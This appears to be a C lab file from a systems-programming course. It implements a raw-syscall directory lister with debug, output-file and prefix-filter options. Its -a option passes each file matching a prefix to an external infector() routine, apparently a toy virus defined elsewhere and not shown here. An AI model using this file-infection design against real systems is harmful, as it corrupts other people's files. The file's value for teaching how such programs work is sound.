#include "util.h"

#define Sys_exit 1
#define Sys_read 3
#define Sys_write 4
#define Sys_open 5
#define Sys_close 6
#define Sys_lseek 19
#define Sys_getdents 141

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define O_WRONLY 1
#define O_CREAT 64
#define O_RDONLY 0
#define O_RDRW 2

#define SEEK_CUR 1
#define newLine 10
#define a_ascii 97
#define z_ascii 122
#define MAX_LENGTH 1024
#define BUF_SIZE 8192

#define DT_BLK 6
#define DT_CHR 2
#define DT_DIR 4
#define DT_FIFO 1
#define DT_LNK 10
#define DT_REG 8
#define DT_SOCK 12
#define DT_UNKNOWN 0

extern int system_call();
extern void code_start();
extern void code_end();
extern void infection();
extern void infector(char*);

int isD = 0;
int output = STDOUT;

typedef struct ent{
    long inode;
    long offset;
    short len;
    char buf[1];
}ent;

void safe2 (int sysRetVal, char* errText){
    if(sysRetVal<0){
        system_call(Sys_write,output,errText,strlen(errText));
        system_call(Sys_write,output,"\n",1);
        system_call(Sys_exit, 0x55,0 ,0);
    }
}

void debugPrint(int sysRetVal, int id){
    system_call(Sys_write,STDERR,"system call id: ",16);
    char* idStr = itoa(id);
    system_call(Sys_write,STDERR,idStr,strlen(idStr));
    system_call(Sys_write,STDERR,"\tretrun code value: ",20);
    char* sysRetValStr = itoa(sysRetVal);
    system_call(Sys_write,STDERR,sysRetValStr,strlen(sysRetValStr));
    system_call(Sys_write,STDERR,"\n",1);
}

int id (char* errText){
    if(!strcmp(errText, "writeErr")) return 4;
    else if(!strcmp( errText, "openOutputFileErr")) return 5;
    else if(!strcmp( errText, "openInputFileErr")) return 5;
    else if(!strcmp( errText, "readErr")) return 3;
    else if(!strcmp( errText, "closeErr")) return 6;
    else if(!strcmp( errText, "getdentErr")) return 141; 
    else return -1;    
}

int safe (int sysRetVal, char* errText){
    if(sysRetVal<0){
        system_call(Sys_write,output,errText,strlen(errText));
        system_call(Sys_write,output,"\n",1);
        system_call(Sys_exit, 0x55,0 ,0);
    }

    if(isD){
        system_call(Sys_write,output,"\n",1);
        debugPrint(sysRetVal, id(errText)); 
    } 

    return sysRetVal;
}

void debugPrintInputOutput(int isO, int isI, char* outputFile, char* inputFile){

        safe2(system_call(Sys_write, STDERR, "The output file is: ", 20), "writeErr");
        if(!isO) safe2(system_call(Sys_write, STDERR, "stdout", 6), "writeErr");
        else     safe2(system_call(Sys_write, STDERR, outputFile, strlen(outputFile)), "writeErr");
        safe2(system_call(Sys_write, STDERR, "\n", 1), "writeErr");

        safe2(system_call(Sys_write, STDERR, "The input  file is: ", 20), "writeErr");
        if(!isI) safe2(system_call(Sys_write, STDERR, "stdin", 5), "writeErr");
        else     safe2(system_call(Sys_write, STDERR, inputFile, strlen(inputFile)), "writeErr");
        safe2(system_call(Sys_write, STDERR, "\n", 1), "writeErr");
    
}

int upperCase (char c){
    return c >= a_ascii && c <= z_ascii;
}

void cleanstr(char str[]){
    int i;
    for(i=0; i<MAX_LENGTH;i++)
        str[i] = '\0';
}

int isLineEmpty (char str[]){
    int i;
    for (i=0; i<strlen(str); i++)
        if(str[i] != '\0')
            return 0;
    return 1;
}

void printLine (int isD, char str[], int output){
    if (!isLineEmpty(str)){
        safe(system_call(Sys_write,output,str, strlen(str)), "writeErr");
        cleanstr(str);
    }
}

void printLast(int isD, char str[], int output, int j){
     if (!isLineEmpty(str)){
         str[j] = '\n';
        safe(system_call(Sys_write,output,str, strlen(str)), "writeErr");
    }
}

void printEntLength(ent *entp){
    char* len = itoa(entp->len);
    safe(system_call(Sys_write, output, len, strlen(len)), "writeErr") ;
}

void printEntName(ent *entp){
    char* name = entp->buf;
    safe(system_call(Sys_write, output, name, strlen(name)), "writeErr") ;
    if(!isD) safe(system_call(Sys_write, output, "\n", 1), "writeErr") ;
}

int printTerms (int isP, ent* entp, char* pPrefix){
    if((isP && !strncmp(entp->buf,pPrefix, strlen(pPrefix)))  )
        return 1;
    else
        return 0;
}

char* fileType (int type){
    if      (type == DT_BLK)      return "block device";       
    else if (type == DT_CHR)      return "character device";    
    else if (type == DT_DIR)      return "directory";          
    else if (type == DT_FIFO)     return "FIFO";               
    else if (type == DT_LNK)      return "symbolic link";       
    else if (type == DT_REG)      return "regular file";        
    else if (type == DT_SOCK)     return "UNIX domain socket"; 
    else if (type == DT_UNKNOWN)  return "unknown";         
    else                          return "IDK";
}

void printEntType(int typeNumber){
    char* type = fileType(typeNumber);
    safe(system_call(Sys_write, output, "type: ", 6), "writeErr") ;
    safe(system_call(Sys_write, output, type , strlen(type)), "writeErr") ;
    safe(system_call(Sys_write, output, "\n", 1), "writeErr") ;
    safe(system_call(Sys_write, output, "\n", 1), "writeErr") ;
}

void printAddress(int addr){
    char* add = itoa(addr);
    safe(system_call(Sys_write, STDOUT, add, strlen(add)),"writeErr");
    safe(system_call(Sys_write, STDOUT, "\n", 1), "writeErr") ; 
}

void printStartEndInfo(){
    safe(system_call(Sys_write, STDOUT, "code start: ", 12), "writeErr") ;
    printAddress((int)code_start);
    safe(system_call(Sys_write, STDOUT, "code end:   ", 12), "writeErr") ;
    printAddress((int)code_end);    
    safe(system_call(Sys_write, STDOUT, "distance:   ", 12), "writeErr") ;
    printAddress((int)(code_end-code_start));
    safe(system_call(Sys_write, STDOUT, "\n", 1), "writeErr") ;
}

int main (int argc , char* argv[]){

    int i;
    char str[MAX_LENGTH]; cleanstr(str);
    int isO = 0;
    int isI = 0;
    int argNumInput = 0;
    int argNumOutput = 0 ;
    int isP = 0;
    int isA = 0;
    char* Prefix;

    for(i=1; i<argc; i++)
        if( (strncmp("-D", argv[i],2)==0) )
            isD = 1 ;

    for(i=1; i<argc; i++){
        if((strncmp("-o", argv[i],2)==0)){
            isO = 1;
            argNumOutput = i;
            output = safe(system_call(Sys_open, argv[i]+2, O_WRONLY | O_CREAT, 0777), "openOutputFileErr" );
        }
        else if((strncmp("-p", argv[i],2)==0)){
            isP = 1;
            Prefix = argv[i]+2;
        }
        else if((strncmp("-a", argv[i],2)==0)){
            isA = 1;
            Prefix = argv[i]+2;
        }
    }

    if(isD) debugPrintInputOutput(isO,isI, argv[argNumOutput]+2 , argv[argNumInput]+2);

    safe(system_call(Sys_write, STDOUT, "Flame 2 strikes!\n", 17),"writeErr");
    safe(system_call(Sys_write, output, "\n", 1), "writeErr") ;

    printStartEndInfo();

    char buffer[BUF_SIZE];
    ent *entp = (ent*) buffer;
    int curDir = safe(system_call(Sys_open, ".", O_RDONLY, 0777), "openInputFileErr");
    int getdentsSize = safe(system_call(Sys_getdents, curDir, buffer, BUF_SIZE),"getdentErr");   

    for(i=0; i<getdentsSize; i+=entp->len){
        entp = (ent*) (buffer + i) ;
        if(printTerms(isP, entp, Prefix)){
            printEntName(entp);
            printEntType((int)(*(buffer + i + entp->len -1)));
            if(isD) printEntLength(entp);
        }
        else if(printTerms(isA, entp, Prefix)){
            printEntName(entp);
            infector(entp->buf);
        }
        else if (!isA && !isP){ 
            printEntName(entp);
            printEntType((int)(*(buffer + i + entp->len -1)));
        }
    }

return 0;       
}
    

